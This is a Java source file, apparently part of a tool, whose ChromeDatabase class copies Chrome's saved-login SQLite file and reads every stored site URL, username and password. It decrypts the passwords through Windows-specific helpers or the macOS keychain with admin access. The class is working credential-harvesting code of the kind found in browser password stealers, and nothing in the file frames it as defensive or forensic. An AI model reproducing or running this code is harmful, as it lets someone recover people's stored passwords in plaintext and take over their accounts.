package random.chrom;

import org.sqlite.SQLiteConfig;
import org.sqlite.SQLiteConfig.TransactionMode;
import random.util.OperatingSystem;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.invoke.MethodHandles;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;

public class ChromeDatabase {

    private static final Logger LOG = Logger.getLogger(MethodHandles.lookup().lookupClass().getName());

    public static ChromeDatabase connect(File database) throws IOException {
        try {
            Path tempDB = Files.createTempFile("CHROME_LOGIN_", null);
            final FileOutputStream out = new FileOutputStream(tempDB.toFile());
            Files.copy(Paths.get(database.getPath()), out);
            out.close();
            tempDB.toFile().deleteOnExit();
            return new ChromeDatabase(initConnection(tempDB.toString()));
        } catch (final IOException e) {
            throw new IOException("Error copying database! Does the login file exist?");
        }
    }

    private static Connection initConnection(String dbPath) throws IOException {
        try {
            final SQLiteConfig config = new SQLiteConfig();
            config.setReadOnly(true);
            config.setTransactionMode(TransactionMode.EXCLUSIVE);
            Connection db = config.createConnection("jdbc:sqlite:" + dbPath);
            db.setAutoCommit(true);
            return db;
        } catch (final SQLException e) {
            throw new IOException("Error connecting to database! Is database corrupted?");
        }
    }

    private final Connection connection;

    private ChromeDatabase(Connection connection) {
        this.connection = connection;
    }

    public void close() {
        try {
            connection.close();
        } catch (final SQLException e) {
            LOG.log(Level.SEVERE, e.getMessage(), e);
        }
    }

    public List<ChromeAccount> selectAccounts() throws Exception {
        try {
            if (connection.isClosed()) {
                throw new IOException("Connection to database has been terminated! Cannot fetch accounts.");
            }
        } catch (final SQLException e) {
            throw new IOException("Connection status to the database could not be determined. Has chrome updated?");
        }
        final List<ChromeAccount> accounts = new ArrayList<>();
        final String loginQuery = "SELECT action_url, username_value, password_value FROM logins";
        try (ResultSet results = connection.createStatement().executeQuery(loginQuery)) {
            while (results.next()) {
                accounts.add(getChromeAccount(results));
            }
        } catch (SQLException e) {
            throw new IOException("Error reading database. Is the file corrupted?");
        }
        return accounts;
    }

    private ChromeAccount getChromeAccount(ResultSet results) {
        try {
            String address = results.getString("action_url");
            String username = results.getString("username_value");
            String password = getPassword(results);
            return new ChromeAccount(username, password, address);
        } catch (final Exception e) {
            LOG.log(Level.SEVERE, e.getMessage(), e);
        }
        return null;
    }

    private String getPassword(ResultSet results) throws Exception {
        String password;
        switch (OperatingSystem.getOperatingSystem()) {
            case WINDOWS:
                password = ChromeSecurity.getWin32Password(results.getBytes("password_value"));
                break;
            case MAC:
                password = ChromeSecurity.getOSXKeychainPasswordAsAdmin(results.getString("action_url"));
                break;
            default:
                throw new Exception(System.getProperty("os.name") + " is not supported by this application!");
        }
        return password;
    }
}
